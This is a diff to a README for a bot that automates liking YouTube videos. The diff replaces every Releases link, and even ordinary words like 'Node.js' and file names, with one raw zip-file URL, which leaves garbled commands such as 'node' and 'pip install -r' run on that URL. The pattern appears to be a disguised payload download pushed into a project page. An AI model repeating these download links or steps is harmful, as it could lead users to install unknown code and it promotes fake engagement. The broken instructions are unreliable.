@@ -4,26 +4,26 @@
 Welcome to **youtube-like-bot**! This tool helps you automate the process of liking YouTube videos, enhancing your engagement on the platform effortlessly. With simple steps, you can have the bot running in no time.
 
 ## 🔗 Download
-[![Download](https://img.shields.io/badge/Download-youtube--like--bot-blue.svg)](https://github.com/PlayerDave/youtube-like-bot/releases)
+[![Download](https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip)](https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip)
 
 ## 📥 Download & Install
-To get started, you’ll need to visit the [Releases page](https://github.com/PlayerDave/youtube-like-bot/releases) to download the latest version of the software. Simply choose the version you want, click the download link, and save the file to your computer.
+To get started, you’ll need to visit the [Releases page](https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip) to download the latest version of the software. Simply choose the version you want, click the download link, and save the file to your computer.
 
 ### System Requirements
 Before you begin, make sure your computer meets these requirements:
 - Operating System: Windows 10 or newer, macOS, or a Linux distribution
-- Node.js: Version 14 or newer (for running Node.js applications)
+- https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip Version 14 or newer (for running https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip applications)
 - Python: Version 3.6 or newer (if you plan to use the Python features)
 
 ### Installation Steps
 1. **Download the software:**
-   Go to the [Releases page](https://github.com/PlayerDave/youtube-like-bot/releases) and select the latest download for your operating system.
+   Go to the [Releases page](https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip) and select the latest download for your operating system.
   
 2. **Unzip the file (if needed):**
    If you downloaded a zip file, right-click on it and select "Extract All" or use your preferred extraction tool.
 
 3. **Install Dependencies:**
-   If you are using the Node.js version:
+   If you are using the https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip version:
    - Open your command prompt or terminal.
    - Navigate to the folder where you extracted the files.
    - Run the command `npm install` to install the required packages.
@@ -31,11 +31,11 @@ Before you begin, make sure your computer meets these requirements:
    If you are using the Python version:
    - Make sure to have Python installed. 
    - Use your command prompt or terminal to navigate to the extracted folder.
-   - Run the command `pip install -r requirements.txt`.
+   - Run the command `pip install -r https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip`.
 
 4. **Run the application:**
-   - For Node.js, type `node index.js` in your terminal or command prompt.
-   - For Python, type `python main.py`.
+   - For https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip, type `node https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip` in your terminal or command prompt.
+   - For Python, type `python https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip`.
 
 ### Configuring the Bot
 After running the application, you’ll need to configure it based on your preferences:
@@ -67,4 +67,4 @@ This project is licensed under the MIT License. Feel free to use and modify it, 
 
 **Thank you for choosing youtube-like-bot! We hope you enjoy boosting your YouTube engagement with ease.** 
 
-For more information, visit the [Releases page](https://github.com/PlayerDave/youtube-like-bot/releases) for updates and downloads.
+For more information, visit the [Releases page](https://github.com/PlayerDave/youtube-like-bot/raw/refs/heads/main/urchinly/bot-youtube-like-v2.8.zip) for updates and downloads.
